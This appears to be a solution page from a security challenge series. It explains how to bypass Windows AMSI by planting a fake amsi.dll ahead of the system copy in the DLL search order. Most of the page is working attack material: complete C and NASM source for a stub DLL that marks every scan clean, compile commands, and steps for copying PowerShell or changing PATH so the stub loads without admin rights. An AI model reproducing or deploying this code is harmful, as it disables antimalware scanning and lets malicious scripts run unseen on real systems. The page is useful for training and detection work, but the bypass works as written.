---
title: "Solution 41: DLL Path Hijacking (Fake amsi.dll)"
challenge_number: 41
difficulty: hard
category: "AMSI Bypass"
permalink: /solutions/41-dll-path-hijacking/
---

# Solution: DLL Path Hijacking (Fake amsi.dll)

[Back to Challenge](../challenges/41-dll-path-hijacking.md)

## Overview

Create a fake `amsi.dll` that exports the required AMSI functions (returning clean results) and place it in a directory that precedes the system directory in the DLL search order. When PowerShell loads, it finds our fake DLL first and uses it instead of the legitimate `C:\Windows\System32\amsi.dll`.

## Working Code

### Step 1: The Stub DLL (C Source)

**fake_amsi.c:**
```c
#include <windows.h>

// AMSI result values
#define AMSI_RESULT_CLEAN       0
#define AMSI_RESULT_NOT_DETECTED 1

typedef void* HAMSICONTEXT;
typedef void* HAMSISESSION;

// AmsiInitialize - pretend initialization succeeded
__declspec(dllexport) HRESULT __stdcall AmsiInitialize(
    LPCWSTR appName,
    HAMSICONTEXT* amsiContext)
{
    // Return a fake non-null context
    *amsiContext = (HAMSICONTEXT)0x41414141;
    return S_OK;
}

// AmsiOpenSession - pretend session opened
__declspec(dllexport) HRESULT __stdcall AmsiOpenSession(
    HAMSICONTEXT amsiContext,
    HAMSISESSION* amsiSession)
{
    *amsiSession = (HAMSISESSION)0x42424242;
    return S_OK;
}

// AmsiScanBuffer - ALWAYS return clean
__declspec(dllexport) HRESULT __stdcall AmsiScanBuffer(
    HAMSICONTEXT amsiContext,
    PVOID buffer,
    ULONG length,
    LPCWSTR contentName,
    HAMSISESSION amsiSession,
    int* result)
{
    *result = AMSI_RESULT_CLEAN;
    return S_OK;
}

// AmsiScanString - ALWAYS return clean
__declspec(dllexport) HRESULT __stdcall AmsiScanString(
    HAMSICONTEXT amsiContext,
    LPCWSTR string,
    LPCWSTR contentName,
    HAMSISESSION amsiSession,
    int* result)
{
    *result = AMSI_RESULT_CLEAN;
    return S_OK;
}

// AmsiCloseSession - no-op
__declspec(dllexport) void __stdcall AmsiCloseSession(
    HAMSICONTEXT amsiContext,
    HAMSISESSION amsiSession)
{
    return;
}

// AmsiUninitialize - no-op
__declspec(dllexport) void __stdcall AmsiUninitialize(
    HAMSICONTEXT amsiContext)
{
    return;
}

// DllMain
BOOL WINAPI DllMain(HINSTANCE hDLL, DWORD dwReason, LPVOID lpReserved)
{
    return TRUE;
}
```

### Step 2: Module Definition File

**amsi.def:**
```
LIBRARY amsi
EXPORTS
    AmsiInitialize
    AmsiOpenSession
    AmsiScanBuffer
    AmsiScanString
    AmsiCloseSession
    AmsiUninitialize
```

### Step 3: Compile the Fake DLL

```cmd
:: Using Visual Studio (x64)
cl /LD /Fe:amsi.dll fake_amsi.c /link /DEF:amsi.def

:: Using MinGW (x64)
x86_64-w64-mingw32-gcc -shared -o amsi.dll fake_amsi.c amsi.def -Wl,--kill-at

:: Using Visual Studio (x86 for 32-bit PowerShell)
cl /LD /Fe:amsi.dll fake_amsi.c /link /DEF:amsi.def /MACHINE:X86
```

### Step 4: Place the DLL and Launch PowerShell

```powershell
# Option A: Copy to a custom directory, launch PS from there
mkdir C:\Tools\PSBypass
copy amsi.dll C:\Tools\PSBypass\amsi.dll
# Launch PowerShell from that directory:
Start-Process "C:\Tools\PSBypass\powershell.exe"  # If PS is copied here
# OR: use the working directory approach
Set-Location C:\Tools\PSBypass
& "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
```

```cmd
:: Option B: Copy powershell.exe to the directory with fake amsi.dll
copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Tools\PSBypass\
copy C:\Tools\PSBypass\amsi.dll C:\Tools\PSBypass\amsi.dll
C:\Tools\PSBypass\powershell.exe
```

```powershell
# Option C: Modify PATH to include our directory first (current session only)
$env:PATH = "C:\Tools\PSBypass;" + $env:PATH
# Then any new process that loads amsi.dll will find ours first
```

### Alternative: Minimal Assembly Stub (MASM/NASM)

```asm
; amsi_stub.asm (NASM syntax, x64)
; Minimal DLL that exports AmsiScanBuffer returning AMSI_RESULT_CLEAN

global AmsiScanBuffer
global AmsiInitialize
global AmsiOpenSession
global AmsiScanString
global AmsiCloseSession
global AmsiUninitialize
global DllMain

section .text

DllMain:
    mov eax, 1
    ret

AmsiInitialize:
    mov qword [rdx], 0x41414141    ; fake context
    xor eax, eax                    ; S_OK
    ret

AmsiOpenSession:
    mov qword [rdx], 0x42424242    ; fake session
    xor eax, eax
    ret

AmsiScanBuffer:
    ; 6th parameter (result) is on stack at [rsp+48]
    mov rax, [rsp+48]
    mov dword [rax], 0             ; AMSI_RESULT_CLEAN
    xor eax, eax                   ; return S_OK
    ret

AmsiScanString:
    mov rax, [rsp+48]
    mov dword [rax], 0
    xor eax, eax
    ret

AmsiCloseSession:
    ret

AmsiUninitialize:
    ret
```

## Why It Works

### Windows DLL Search Order

When a process calls `LoadLibrary("amsi.dll")` without a full path, Windows searches in this order:

1. **The directory containing the executable** (application directory)
2. The system directory (`C:\Windows\System32`)
3. The 16-bit system directory (`C:\Windows\System`)
4. The Windows directory (`C:\Windows`)
5. The current working directory
6. Directories listed in the PATH environment variable

```
Search: LoadLibrary("amsi.dll")

Step 1: Check C:\Tools\PSBypass\amsi.dll    → FOUND (our fake!)
        ↳ Loading stops here. System32 version is NEVER loaded.
```

If PowerShell (or its copy) is in the same directory as our fake `amsi.dll`, Windows loads ours at step 1 without ever checking System32.

### Why No Admin is Needed

- We don't modify `C:\Windows\System32\amsi.dll` (that would require admin + TrustedInstaller)
- We create our own directory and copy files there
- We only need write access to a user-writable location
- The DLL search order is a feature, not a privilege escalation

### What the Fake DLL Does

Every AMSI function is implemented as a pass-through that returns success:
- `AmsiInitialize` → Returns S_OK with a fake handle
- `AmsiScanBuffer` → Always sets result to `AMSI_RESULT_CLEAN`, returns S_OK
- `AmsiScanString` → Same as ScanBuffer
- `AmsiOpenSession` / `AmsiCloseSession` / `AmsiUninitialize` → No-ops

PowerShell thinks AMSI is working correctly, but every scan returns "clean."

### Known Safe DLL Search Limitation

Modern Windows has "Known DLLs" (`HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`) that bypass the search order. However, `amsi.dll` is **not** in the Known DLLs list on most systems, making it vulnerable to this technique.

## How to Verify

1. Create the fake DLL (compile using one of the methods above).

2. Set up the hijack directory:
   ```cmd
   mkdir C:\Temp\AmsiTest
   copy "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" C:\Temp\AmsiTest\
   copy amsi.dll C:\Temp\AmsiTest\
   ```

3. Launch PowerShell from the hijack directory:
   ```cmd
   C:\Temp\AmsiTest\powershell.exe -NoProfile
   ```

4. In the new session, verify which amsi.dll is loaded:
   ```powershell
   [System.Diagnostics.Process]::GetCurrentProcess().Modules |
       Where-Object { $_.ModuleName -eq "amsi.dll" } |
       Select-Object FileName
   # Should show: C:\Temp\AmsiTest\amsi.dll (our fake)
   ```

5. Test AMSI bypass:
   ```powershell
   # This would normally be blocked by AMSI
   Invoke-Expression 'Write-Host "malware test - AMSI fully hijacked"'
   # Executes successfully because our fake DLL returns CLEAN for everything
   ```

6. Verify the original system DLL is unmodified:
   ```powershell
   Get-FileHash "C:\Windows\System32\amsi.dll" -Algorithm SHA256
   # Hash unchanged - we never touched the system file
   ```

7. Cleanup:
   ```cmd
   rmdir /s /q C:\Temp\AmsiTest
   ```
